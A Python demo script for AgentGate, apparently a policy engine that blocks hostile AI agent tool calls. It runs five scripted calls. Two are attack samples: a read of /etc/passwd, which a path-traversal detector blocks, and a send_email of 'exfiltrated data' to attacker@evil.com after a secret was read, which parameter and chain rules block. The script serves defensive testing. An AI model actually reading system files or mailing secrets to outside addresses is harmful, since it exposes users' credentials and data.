#!/usr/bin/env python3
"""AgentGate golden path demo — shows the policy engine blocking attacks.

Runs 5 hardcoded tool calls through the engine and prints colored output
showing which calls were allowed and which were blocked, and why.

Usage:
    python examples/demo_agent.py
    python examples/demo_agent.py --no-color
"""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from agentgate.engine import evaluate
from agentgate.models import Decision, ToolCall
from agentgate.policy import load_and_compile
from agentgate.session import SessionStore

# ---------------------------------------------------------------------------
# ANSI helpers
# ---------------------------------------------------------------------------

_color_enabled = True


def _green(text: str) -> str:
    return f"\033[32m{text}\033[0m" if _color_enabled else text


def _red(text: str) -> str:
    return f"\033[31m{text}\033[0m" if _color_enabled else text


def _bold(text: str) -> str:
    return f"\033[1m{text}\033[0m" if _color_enabled else text


def _dim(text: str) -> str:
    return f"\033[2m{text}\033[0m" if _color_enabled else text


# ---------------------------------------------------------------------------
# Output formatting
# ---------------------------------------------------------------------------

BORDER_THICK = "\u2550" * 59
BORDER_THIN = "\u2500" * 59


def print_step(
    num: int,
    total: int,
    label: str,
    tool_call: ToolCall,
    decision: Decision,
    narrative: str,
) -> None:
    """Print a single demo step with borders and color."""
    print(f"\n{BORDER_THICK}")
    print(_bold(f"  Step {num}/{total}: {label}"))
    print(BORDER_THICK)

    args_str = json.dumps(tool_call.arguments)
    print(f"\n  Tool:      {tool_call.tool_name}")
    print(f"  Arguments: {args_str}")

    if decision.action == "allow":
        print(f"\n  Decision:  {_green('✅ ALLOW')}")
        rule_info = decision.matched_rule or "(none — default allow)"
        print(f"  Rule:      {rule_info}")
    else:
        print(f"\n  Decision:  {_red('🚫 BLOCK')}")
        if decision.matched_detector:
            print(f"  Detector:  {decision.matched_detector}")
        if decision.matched_rule:
            print(f"  Rule:      {decision.matched_rule}")
        if decision.message:
            print(f"  Detail:    {decision.message}")

    # Narrative — indent each line with arrow on first, spaces on rest
    lines = narrative.split("\n")
    print(f"\n  → {lines[0]}")
    for line in lines[1:]:
        print(f"    {line}")

    print(f"\n{BORDER_THIN}")


def print_summary(results: list[tuple[int, Decision]]) -> None:
    """Print the summary footer after all steps."""
    allowed = [num for num, d in results if d.action == "allow"]
    blocked = [num for num, d in results if d.action == "block"]

    allowed_str = ", ".join(str(n) for n in allowed)
    blocked_str = ", ".join(str(n) for n in blocked)

    print(f"\n{BORDER_THICK}")
    print(_bold("  Summary"))
    print(BORDER_THICK)
    print(f"\n  Total calls:  {len(results)}")
    print(f"  Allowed:      {len(allowed)}  (steps {allowed_str})")
    print(f"  Blocked:      {len(blocked)}  (steps {blocked_str})")
    print()
    print("  Detectors:    path_traversal fired on step 2")
    print("  Param rules:  sandboxed-files, internal-email-only")
    print("  Chain rules:  block-exfil-after-sensitive-read (defense in depth on step 4)")
    print()
    print("  Policy file:  examples/policies/demo.yaml")
    print()
    print("  Run it yourself:")
    print("    python examples/demo_agent.py")
    print()
    print("  Or through the proxy with a real MCP server:")
    print("    agentgate start --policy examples/policies/demo.yaml \\")
    print("      -- python examples/email_mcp_server.py")
    print(BORDER_THICK)


# ---------------------------------------------------------------------------
# Demo steps
# ---------------------------------------------------------------------------

STEPS = [
    {
        "label": "Benign file read",
        "tool_call": ToolCall(
            tool_name="read_file",
            arguments={"path": "/data/workspace/reports/q4.csv"},
        ),
        "narrative": (
            "Normal operation. File is within the allowed sandbox."
        ),
        "simulated_response": None,
    },
    {
        "label": "Path traversal attack",
        "tool_call": ToolCall(
            tool_name="read_file",
            arguments={"path": "/etc/passwd"},
        ),
        "narrative": (
            "AgentGate blocked this before the param_rule even ran.\n"
            "The path_traversal detector catches /etc/* regardless\n"
            "of any policy rules."
        ),
        "simulated_response": None,
    },
    {
        "label": "Read file containing sensitive data",
        "tool_call": ToolCall(
            tool_name="read_file",
            arguments={"path": "/data/workspace/inbox/proposal.txt"},
        ),
        "narrative": (
            "File allowed — it's within the sandbox. But the response\n"
            "contains API_KEY=sk-abc123... which the session store records.\n"
            "This sets up the chain detection trigger for the next step."
        ),
        "simulated_response": (
            "Project proposal draft\n"
            "Config: API_KEY=sk-abc123-secret-key-do-not-share\n"
            "Please review by Friday."
        ),
    },
    {
        "label": "Exfiltration attempt (chain detection)",
        "tool_call": ToolCall(
            tool_name="send_email",
            arguments={"to": "attacker@evil.com", "body": "exfiltrated data"},
        ),
        "narrative": (
            "The param_rule caught this first (external email address).\n"
            "But even if the address were allowed, the chain_rule would fire:\n"
            "Step 3 read a file containing 'API_KEY=', and now send_email\n"
            "targets an external address."
        ),
        "simulated_response": None,
    },
    {
        "label": "Benign internal email",
        "tool_call": ToolCall(
            tool_name="send_email",
            arguments={
                "to": "boss@mycompany.com",
                "subject": "Q4 Summary",
                "body": "Revenue was $10M last quarter.",
            },
        ),
        "narrative": (
            "Internal email to @mycompany.com passes all rules.\n"
            "No chain rule fires because the recipient is internal."
        ),
        "simulated_response": None,
    },
]


# ---------------------------------------------------------------------------
# Main logic
# ---------------------------------------------------------------------------


def run_scripted() -> int:
    """Run the 5-step scripted demo. Returns 0 on success, 1 on unexpected results."""
    policy_path = Path(__file__).parent / "policies" / "demo.yaml"
    policy = load_and_compile(policy_path)
    session = SessionStore()

    results: list[tuple[int, Decision]] = []

    for i, step in enumerate(STEPS):
        tc = step["tool_call"]
        decision = evaluate(tc, policy, session)

        # Record allowed calls in the session (mirrors proxy behavior)
        if decision.action == "allow":
            entry = session.record_request(tc.tool_name, tc.arguments)
            if step["simulated_response"]:
                session.record_response(entry, step["simulated_response"])

        step_num = i + 1
        results.append((step_num, decision))
        print_step(step_num, len(STEPS), step["label"], tc, decision, step["narrative"])

    print_summary(results)

    # Verify expected outcomes: 3 allows, 2 blocks
    n_allow = sum(1 for _, d in results if d.action == "allow")
    n_block = sum(1 for _, d in results if d.action == "block")
    if n_allow == 3 and n_block == 2:
        return 0
    print(f"\n  ⚠ Unexpected results: {n_allow} allows, {n_block} blocks (expected 3/2)")
    return 1


def main() -> None:
    parser = argparse.ArgumentParser(description="AgentGate golden path demo")
    parser.add_argument(
        "--no-color", action="store_true", help="Disable colored output"
    )
    args = parser.parse_args()

    global _color_enabled  # noqa: PLW0603
    _color_enabled = sys.stdout.isatty() and not args.no_color

    sys.exit(run_scripted())


if __name__ == "__main__":
    main()
